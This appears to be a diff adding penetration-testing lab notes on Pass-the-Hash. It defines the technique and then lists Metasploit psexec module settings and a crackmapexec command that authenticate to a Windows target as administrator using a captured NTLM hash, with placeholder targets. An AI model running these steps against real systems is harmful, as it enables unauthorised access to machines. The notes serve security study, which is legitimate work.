@@ -1,0 +1,30 @@
+Pass-the-Hash
+
+Pass-the-Hash is an **exploitation technique** where an attacker:
+
+- Captures or dumps **NTLM password hashes**
+- Uses the hash directly to **authenticate to a system**
+- Does NOT need the actual password
+
+We can use multiple tools to facilitate a pass the hash attack:
+- Metasploit Psexec module
+- Crackmapexec
+
+
+Lab demonstration
+ctrl  + z
+search psexec
+use exploit/windows/smb/psexec
+show options
+set RHOSTS <target-ip>
+set LPORT 4442
+set SMBUser administrator
+set SMBPass <paste-the-hash>
+set target Native\ upload
+run
+
+
+Option 2
+Using crackmapexec
+
+crackmapexec smb <target-ip> -u administrator -H <'hash'>
